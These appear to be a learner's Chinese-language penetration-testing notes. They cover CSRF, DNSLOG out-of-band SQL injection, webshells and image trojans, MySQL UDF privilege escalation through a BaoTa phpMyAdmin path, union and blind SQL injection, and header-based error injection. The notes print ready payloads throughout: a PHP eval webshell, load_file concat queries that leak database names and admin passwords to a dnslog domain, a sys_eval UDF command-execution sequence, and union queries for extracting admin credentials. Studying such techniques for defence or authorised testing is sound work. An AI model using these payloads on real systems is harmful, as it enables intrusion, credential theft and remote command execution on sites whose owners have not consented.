# CSRF跨站伪造请求

> **待办事项**
>
> - [ ] CSRF PoC是什么？

- 攻击过程

1. 存储请求

2. 触发请求

- 通过**burp**截获客户端发送修改请求的数据包，然后使用**burp**自带工具**CSRF PoC**生成CSRF攻击，也就是将请求保存下来，再通过这个工具重新回到网站伪造请求对该用户的数据进行修改。

  `test.php?DE=PHPINFO();`

- 网站后台：上传文件漏洞，上传木马，获取网站操作权限

# DNSLOG注入

> 漏洞利用：
>
> dns解析地址的时候会将别人询问的域名记录下来。



​	首先，先了解一下**盲注**是什么：向服务器问问题。比如说下面这个语句，就是在`url`后面的参数中传递这样一串sql语句，如果返回的没有内容或者是错误，那这个服务器的数据库名称不是以k开头的。

```mysql
select * from news where id=1 and substr(database(),1,1)='k'
```

如果像上面这个一个一个的问，那会很麻烦。

**oob：out of band **数据外带

- **实例分析**

在`dnslog.cn`中显示管理员密码

1. 查数据库的库名:`select database();`

2. 拼接`concat：select concat('b','a');`->显示ba

子查询：`concat((select database()),'.d0vag1.dnslog.cn');`

3. 让目标访问构造的域名

`load_file('//C:/target/.../1.txt') 使用unc路径//`

读取文件内容，本地与远程都ok

最终结果:

```mysql
load_file(concat('//',(select database()),'.域名/1.txt'));
select hex(password) from admin limit 1,1
```

使用hex编码的目的是为了区分传来数字的大小写

 # 文件解析漏洞

> 待办事项
>
> - [ ] src？？应急响应中心：应付甲方
> - [ ] 用什么解析，找到什么漏洞，怎么利用的。
>
> - [ ] 你测过什么漏洞？？？

- **web shell**

  web的含义是需要服务器开放web服务；shell是一个人机交互界面

  木马可以帮助拿到shell，以达到控制网站服务器的目的。

  执行从用户那边取得的信息：

  `<?php @eval($_REQUEST[test]) ?>`

- **shell管理工具**：中国菜刀，中国蚁剑，冰蝎

- **上传木马**：找一个上传点，将木马传入到目标服务器。木马的作用是在目标服务器中为我们提供想要的内容。木马以某种形式保存到目标机器

- 木马生效是因为解析：asp cer asa asmx svc png/.php

> 上传绕过、找规则、限制类型、上传规则、保存规则、规律规则

- **图片马**：`COPY 1.png/b+a.php b.png`

  `b.png`中已经被注入木马

- **phpStudy nginx 漏洞解析**：`123.png/.php?a=phpinfo()`将图片当成`.php`文件进行解析，双击电脑编程服务器，并且安装数据库。

> 端口：3306 密码：rootroot

- **phpmyadmin 写马**

  图片被上传到服务器的过程中被使用base64编码



# UDF提权

> 数据库提权
>
> exp：漏洞利用脚本 smbv3 exploit-db.com
>
> 有用的网站：i.zkaq.org

- 如何提权：内核漏洞 借助高权限

- 列出运行的服务：tasklist -svc

- **实例分析**

下面演示如何进入宝塔`phpadmin`进行数据库提权，执行系统命令进行权限提取。

宝塔 888/pma漏洞：`ip或域名:888/pma`可直接进入`phpMyadmin`，从而进行数据库修改。

1. **判断服务器版本**：

```mysql
select @@version_compile_os ,@@version_compile_machine,@@version;
select @@plugin_dir;
```

2. **udf.dll**

   如何获取：

   - sqlmap中获取：已经加密的

   - github搜索

   如何处理：(加密成16进制)

   1. 命令行执行：

      `certutil -encodehex -f -v udf32.dll w32x.txt 4`

   2. 数据库处理：

      ```mysql
      select hex(load_file('l64.so'))  into dumpfile  'l64.hex'
      ```

      - `outfile`:有格式的转换  `dumpfile`：原始数据格式

      - 转换的十六进制文件有空格和换行，需要将空格和换行去掉

3. **写入文件**

   `select 十六进制文件 into dumpfile ‘路径加文件名’`

4. **生成函数**

   ```mysql
   create function sys_eval returns string soname '1.so'；
   ```

5. **验证**

   ```mysql
   select * from mysql.func where name='sys_eval';
   select sys_eval('ls /')
   ```

   

# SQL注入

> 联合注入、盲注、报错注入、偏移、反弹、dns_log
>
> xss、csrf、xxe、ssti、ssrf
>
> 文件上传
>
> 漏洞盒子（挖漏洞的网站）
>
> AWD（攻击目标靶场之后把站点还原）

- 注入：

  构造的语句拼接到原本的语句代入到数据库执行（增删改查）条件如下：

  1. 用户参数可控
  2. 语句执行

- 数据库：一堆表组成的集合

  表：类似excel，由行和列组成

  字段：表中的列称为字段

  记录：表中的行称为记录

  单元格：行和列相交的地方称为单元格

- 事例：

  万豪酒店数据库数据泄露

- 增删改查：

  ```mysql
  select
  
  delete
  ```

- 重要的数据库：information_schema 

  第一张表：schemata，存储着所有的数据库：table_schema字段

  第二张表：tables，存储着所有的表：table_schema字段，table_name字段表要和数据库对应起来，因为可能两个不同的数据库会有相同的表名。

  第三张表：columns，存储着所有的字段：table_schema字段，table_name字段，columns_name字段。

- 主要语法：

  ```mysql
  select * from table_name 
  where  and/or #可以根据字段满足的条件(=,<,>)进行搜索
  order by #数字(该数据代表字段的序号)
  limit 1,2 #从第二行起显示两条数据
  union #联合查询
  ```

- 过程

  1. 判断是否存在sql注入（网页直接与数据库进行交互，语句能够执行）：

     - 在url中传参后面加上 `and 1=1` 与`and 1=2`(两种分开执行），如果前者输出的界面正常，后者不正常，说明存在。

       比如说：`http://域名/?id = 1 and 1=1` 返回正常；`http://域名/?id =1 and 1=2`返回的页面不正常。

  2. 使用sql注入获取我们需要的信息：

     目的：得到管理员的密码

     - 知道表有多少个字段名：
       `http://域名/?id =1 order by 1`直到页面不正常

     - 找到回显点：也就是能够在页面中显示信息的点

       方法：

       - 使用联合查询：

         `http://域名/?id =1 and 1=2 union select 1,2 `

         使用`id=1 and 1=2`是因为union的时候要两个表的字段数相同才可以显示，让前面那条语句为false就可以了。

       知道回显点在哪里，就可以查询数据库，表，字段名了。

     - **显示数据库名：**

       `http://域名/?id =1 and 1=2 union select 1,database()`

       得到数据库名：**maoshe**

       **显示表名：**

       `http://域名/?id =1 and 1=2 union select 1,table_name() from information_schema.tables where table_schema='maoshe' limit 0,1`

       修改limit参数。

       得到表名：**admin、dir、xss**

       **显示字段名：**

       `http://域名/?id =1 and 1=2 union select 1,column_name() from information_schema.columns where table_name='admin' limit 0,1`

       修改limit参数。

       得到字段名：**username、password**

  3. 当id有引号的时候，人为闭合？？`id=1'`,不懂

     传到数据库的时候会有显示为`id='1' and 1=1'`，加上--qwe？？

# 盲注

- 迂回绕过

  页面不显示

- 什么是盲注：

  目标存在注入，但在页面上没有任何回显。盲注就是问问题。

  1. 布尔盲注：直接返回true或者false
  2. 时间盲注：返回时间的长短判断注入的语句是否正确

- 盲注函数解析：

  1. length()函数

     `length(database())`:返回数据库名字的长度

     `id =1 and length(database())>几`

  2. `substr(database(),2,1)`函数，从1开始。

     `id =1 and substr(database(),1,1)='k'`：数据库的第一个字母是不是k

     `id=1 and ascii(substr(database(),1,1))>数字`：也是判断

     在这里最好在substr的结果后面加个ascii码，因为字母的显示有时候有异议。

  3. if函数：if(条件，结果1，结果2)：条件为true时结果1，条件为false结果2

  4. 子查询：加个括号，括号里面必须是一条完整的查询语句。

- 使用burp进行攻击：

  可以使用intruder工具，构造payload进行攻击。

- 整体思路：

  1. 先问长度（length（））
  2. 挨个问每个名字的组成（limit）
  3. 使用burp工具

# HEAD注入

User-Agent：

- updatexml()函数

  语法：`updatexml（目标xml内容，xml文档路径，更新的内容）`

  路径由特殊符号和想要的内容构成。（因为如果有特殊符号就会报错，然后回显）

  ```mysql
  updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
  ```

  实际上这里是去更新了xml文档，但是我们在xml文档路径的位置里面写入，然后就因为不符合输入规则报错了。（报错注入）

  但是报错的时候其实已经执行了自查询代码。

  

- 插入语句

  ```mysql
  insert into tabel_name(字段名) values(对应的值);
  ```

- 当在burp中改包的时候，改参数user-agent参数值，修改为：

  首先要查看源代码，发现传user-agent的时候用的是insert语句，如上所示，对应的值用`''`单引号括起来，并且如果输入的参数错误的话会回显，所以我们在传user-agent的值后面加入下面的句子：(插入的为or（包含or）后面的语句)

  ```mysql
  insert into table_name(agent, ...) values(' or updatexml (1,concat('0x7e',(select database()),'0x7e'),1)',...)
  ```

  `payload=or updatexml (1,concat('0x7e',(select database())','0x7e'),1)`

  因为内容单引号禁锢住了？？？，所以需要将payload改为`payload-- +`

  `-- +`为注释？？把后面的内容注释掉了？？所以代回到语句中的时候，values的`(`没有对应的右括号，所以payload要改为`payload)-- +`

Referer：从哪里来

插件推荐：ModHeader

X-Forwarded-For：记录ip

# sqlmap

[github_sqlmap_usage](https://gitHub.com/sqlmapproject/sqlmap/wiki/Usage)

[cnblogs_sqlmap_usage](https://cnblogs.com/hongfei/p/3872156.html)

# 